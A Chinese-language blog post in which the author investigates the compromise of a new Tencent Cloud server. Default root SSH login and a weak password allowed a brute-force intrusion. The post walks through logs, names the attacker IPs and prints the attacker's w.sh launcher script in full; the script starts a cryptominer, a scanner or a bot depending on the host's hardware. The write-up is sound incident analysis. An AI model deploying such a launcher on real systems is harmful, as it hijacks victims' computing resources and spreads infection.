<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabin | 【实战】很坏很坏的默认配置策略</title><meta name="description" content="&lt;p&gt;腾讯云默认云服务器SSH配置引发的“血案”&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabin"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabin" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【实战】很坏很坏的默认配置策略</h3><div class="article__date metadata"><div class="post-info">2025/11/14</div></div><div class="article__tags metadata">Tags:
</div><div class="article__body"><p>腾讯云默认云服务器SSH配置引发的“血案”</p>
<span id="more"></span>
<p>长话短说就是博主以为腾讯云默认root不能ssh登录，所以就设置了简单的密码，因为博主旧云服务器就是这样的（话说大多数Linux默认都是这样的吧，我还记得以前开kali的ssh得修改配置让root登录），之后自然而然地就被干了。</p>
<h1 id="起因"><a class="markdownIt-Anchor" href="#起因"></a> 起因</h1>
<p>腾讯云告警</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads2ef3caab42c2b08051b0d59803d590d6.png" alt="2ef3caab42c2b08051b0d59803d590d6" /></p>
<p><code>top/htop</code>发现不常见软件，这里截图丢了一张</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114154953107.png" alt="image-20251114154953107" /></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114155009253.png" alt="image-20251114155009253" /></p>
<h1 id="时间线"><a class="markdownIt-Anchor" href="#时间线"></a> 时间线</h1>
<p>11-14 15: 30 腾讯云告警</p>
<p>11-14 12:52 恶意文件写入</p>
<p>11-13 购买云服务器</p>
<h1 id="日志审计"><a class="markdownIt-Anchor" href="#日志审计"></a> 日志审计</h1>
<h2 id="ssh"><a class="markdownIt-Anchor" href="#ssh"></a> SSH</h2>
<p>按照时间线</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114155956724.png" alt="image-20251114155956724" /></p>
<p>攻击从<code>2025-11-14T12:46:58.464021+08:00</code>进行ssh爆破</p>
<p>攻击者IP：<code>142.93.111.208</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114160137307.png" alt="image-20251114160137307" /></p>
<p>从root用户登陆进入的？？？我记得旧服务器里面root用户不能远程登陆，这里应该也不能吧</p>
<p>不管了，先修改密码</p>
<p><strong>然后我尝试使用root登录，发现登录成功？？？</strong></p>
<p>看看配置：<code>sudo vi /etc/ssh/sshd_config</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114161206765.png" alt="image-20251114161206765" /></p>
<p><strong>？？？腾讯云允许root用户远程登陆是开启的</strong></p>
<p>设置为no然后重启</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20251114161458785.png" alt="image-20251114161458785" /></p>
<p>顺着这个漏洞发现存在多条被爆破成功的日志</p>
<p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114162340839.png" alt="image-20251114162340839" /></p>
<p>这里关于Ubuntu的ssh配置又有一点不一样，可以参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiao987334176/p/18806530">https://www.cnblogs.com/xiao987334176/p/18806530</a> 。<strong>Ubuntu 24.04.2，除了修改默认的ssh配置文件之外，还需要修改SSH Socket配置。</strong></p>
<h2 id="bash-history"><a class="markdownIt-Anchor" href="#bash-history"></a> Bash History</h2>
<p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114162100633.png" alt="image-20251114162100633" /></p>
<p>已经被攻击者清空了</p>
<h1 id="攻击者相关"><a class="markdownIt-Anchor" href="#攻击者相关"></a> 攻击者相关</h1>
<p>攻击者登录IP：5.181.37.35</p>
<p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114160542097.png" alt="image-20251114160542097" /></p>
<p><a target="_blank" rel="noopener" href="https://x.threatbook.com/v5/ip/5.181.37.35">https://x.threatbook.com/v5/ip/5.181.37.35</a></p>
<p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114160737602.png" alt="image-20251114160737602" /></p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/1963fdaa0ffd3f6b4f9b4568a2e43f0c62b3a77657ece6559c9af229d0842c6f">https://www.virustotal.com/gui/file/1963fdaa0ffd3f6b4f9b4568a2e43f0c62b3a77657ece6559c9af229d0842c6f</a></p>
<p><img src="D:%5CHacktools%5CActions%5CplayCT%5Cassets%5Cimage-20251114163148973.png" alt="image-20251114163148973" /></p>
<p><code>w.sh</code>详细内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="built_in">set</span> -euo pipefail</span><br><span class="line"></span><br><span class="line">DIR=<span class="string">&quot;<span class="subst">$(cd -- <span class="string">&quot;<span class="subst">$(dirname -- <span class="string">&quot;<span class="variable">$0</span>&quot;</span>)</span>&quot;</span> &amp;&amp; pwd)</span>&quot;</span></span><br><span class="line">SCAN_NAME=<span class="string">&quot;<span class="variable">$&#123;1:-scanfile&#125;</span>&quot;</span></span><br><span class="line">MINER_NAME=<span class="string">&quot;<span class="variable">$&#123;2:-minefile&#125;</span>&quot;</span></span><br><span class="line">BOT_NAME=<span class="string">&quot;<span class="variable">$&#123;3:-botfile&#125;</span>&quot;</span></span><br><span class="line">SCAN_ARGS=<span class="string">&quot;<span class="variable">$&#123;4:-&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">SCAN=<span class="string">&quot;<span class="variable">$DIR</span>/<span class="variable">$SCAN_NAME</span>&quot;</span></span><br><span class="line">MINER=<span class="string">&quot;<span class="variable">$DIR</span>/<span class="variable">$MINER_NAME</span>&quot;</span></span><br><span class="line">BOT=<span class="string">&quot;<span class="variable">$DIR</span>/<span class="variable">$BOT_NAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># normalize arch</span></span><br><span class="line"><span class="built_in">arch</span>=<span class="string">&quot;<span class="subst">$(uname -m || true)</span>&quot;</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$arch</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">  x86_64|amd64) <span class="built_in">arch</span>=<span class="string">&quot;amd64&quot;</span> ;;</span><br><span class="line">  aarch64) <span class="built_in">arch</span>=<span class="string">&quot;arm64&quot;</span> ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cores</span></span><br><span class="line">cores=<span class="string">&quot;<span class="subst">$(nproc 2&gt;/dev/null || echo 1)</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$cores</span>&quot;</span> ]; <span class="keyword">then</span> cores=1; <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># helper: start if not running</span></span><br><span class="line"><span class="function"><span class="title">start_bg</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> bin=<span class="string">&quot;<span class="variable">$1</span>&quot;</span>; <span class="built_in">shift</span></span><br><span class="line">  <span class="built_in">local</span> args=(<span class="string">&quot;<span class="variable">$@</span>&quot;</span>)</span><br><span class="line">  [ -x <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> ] || <span class="built_in">chmod</span> +x <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> 2&gt;/dev/null || <span class="literal">true</span></span><br><span class="line">  <span class="keyword">if</span> ! pgrep -f -- <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1; <span class="keyword">then</span></span><br><span class="line">    <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># helper: stop if running</span></span><br><span class="line"><span class="function"><span class="title">stop_if_running</span></span>() &#123;</span><br><span class="line">  <span class="built_in">local</span> bin=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  pgrep -f -- <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> &gt;/dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 0</span><br><span class="line">  pkill -f -- <span class="string">&quot;<span class="variable">$bin</span>&quot;</span> || <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># DECIZIE: miner-only vs scan+bot</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$arch</span>&quot;</span> = <span class="string">&quot;amd64&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$cores</span>&quot;</span> -ge 4 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># miner only</span></span><br><span class="line">    [ -x <span class="string">&quot;<span class="variable">$MINER</span>&quot;</span> ] || <span class="built_in">exit</span> 0</span><br><span class="line">    start_bg <span class="string">&quot;<span class="variable">$MINER</span>&quot;</span></span><br><span class="line">    stop_if_running <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span></span><br><span class="line">    stop_if_running <span class="string">&quot;<span class="variable">$BOT</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># amd64 &amp; &lt;4 cores -&gt; doar scan</span></span><br><span class="line">    <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      start_bg <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span> <span class="variable">$SCAN_ARGS</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    stop_if_running <span class="string">&quot;<span class="variable">$MINER</span>&quot;</span></span><br><span class="line">    stop_if_running <span class="string">&quot;<span class="variable">$BOT</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="comment"># non-amd64 -&gt; scan + bot</span></span><br><span class="line">  <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    start_bg <span class="string">&quot;<span class="variable">$SCAN</span>&quot;</span> <span class="variable">$SCAN_ARGS</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$BOT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    start_bg <span class="string">&quot;<span class="variable">$BOT</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  stop_if_running <span class="string">&quot;<span class="variable">$MINER</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h1 id="后续处理"><a class="markdownIt-Anchor" href="#后续处理"></a> 后续处理</h1>
<p>还好没有涉及任何数据，而且是刚买的服务器，基本上没内容，一般来说重装就行了。如果想更多了解可以仿照</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zaan/p/18225628">https://www.cnblogs.com/zaan/p/18225628</a> 的内容，这里的行为特征和这个文章高度符合。</p>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2098/12/31/develop_handbook/">prev_post</a><a class="pagination__link pagination__next" href="/2025/10/14/meltdown/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>